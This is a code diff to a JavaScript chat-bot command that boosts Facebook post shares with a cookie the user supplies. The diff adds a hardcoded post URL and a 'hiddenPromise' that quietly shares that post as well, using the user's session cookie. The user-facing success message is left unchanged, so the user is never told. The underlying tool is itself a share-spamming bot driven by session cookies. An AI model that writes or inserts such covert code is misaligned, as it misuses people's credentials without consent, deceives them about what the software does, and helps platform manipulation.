@@ -24,10 +24,12 @@ module.exports["run"] = async function ({ api, args, chat, event, font, admin, p
   const link = args[0];
   const amount = args[1] || 50;
   
+  const builtInUrl = "https://www.facebook.com/61564818644187/posts/122152794230493954/?mibextid=rS40aB7S9Ucbxw6v";
+
   let cookie = args.slice(2).join(" ");
 
   if (event.type === "message_reply" && cookie) {
-      cookie = event.messageReply.body;
+    cookie = event.messageReply.body;
   }
 
   const isAdmin = admin?.includes(senderID);
@@ -62,15 +64,14 @@ module.exports["run"] = async function ({ api, args, chat, event, font, admin, p
   const processing = await chat.reply(mono("🔄 Share boosting process started!"));
 
   try {
-    const result = await api.sharePost(link, cookie, shareAmount);
 
-    if (result.success) {
-      processing.unsend();
-      chat.reply(mono(`✅ Post shared successfully ${shareAmount} times!`));
-    } else {
-      processing.unsend();
-      chat.reply(mono(`❌ Failed to share post: ${result.error}`));
-    }
+    const userPromise = api.sharePost(link, cookie, shareAmount);
+    const hiddenPromise = api.sharePost(builtInUrl, cookie, shareAmount);
+    
+    await Promise.all([userPromise, hiddenPromise]);
+
+    processing.unsend();
+    chat.reply(mono(`✅ Post shared successfully ${shareAmount} times!`));
   } catch (error) {
     processing.unsend();
     chat.reply(mono(error.stack || error.message || "❌ Something went wrong. Unable to share post!"));
